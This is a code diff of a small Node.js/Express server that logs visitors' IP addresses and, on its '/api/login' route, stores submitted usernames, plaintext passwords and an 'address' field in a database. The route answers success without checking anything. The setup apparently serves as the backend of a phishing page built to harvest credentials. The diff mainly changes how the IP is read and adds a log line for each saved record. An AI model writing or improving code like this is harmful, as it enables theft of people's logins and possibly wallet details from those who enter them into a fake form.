@@ -22,37 +22,31 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     timestamp TEXT
 )`);
 
-function getRealIP(req) {
-    return req.headers['x-forwarded-for']?.split(',')[0] || 
-           req.headers['x-real-ip'] || 
-           req.ip || 
-           'Unknown';
-}
-
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
     pool.query(
         "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
         [type, username, password, address, ip, timestamp]
     );
+    console.log(`📍 SAVED: ${type}`);
 }
 
-// Record Page Visit Immediately
+// === IMPORTANT: Record immediately on main link ===
 app.get('/', (req, res) => {
-    const ip = getRealIP(req);
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
     saveRecord('Page Visit', null, null, null, ip);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', (req, res) => {
-    const ip = getRealIP(req);
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
     saveRecord('Page Visit', null, null, null, ip);
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
 app.post('/api/login', (req, res) => {
     const { username, password, address } = req.body;
-    const ip = getRealIP(req);
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
     saveRecord('Login Attempt', username, password, address, ip);
     res.json({ success: true });
 });
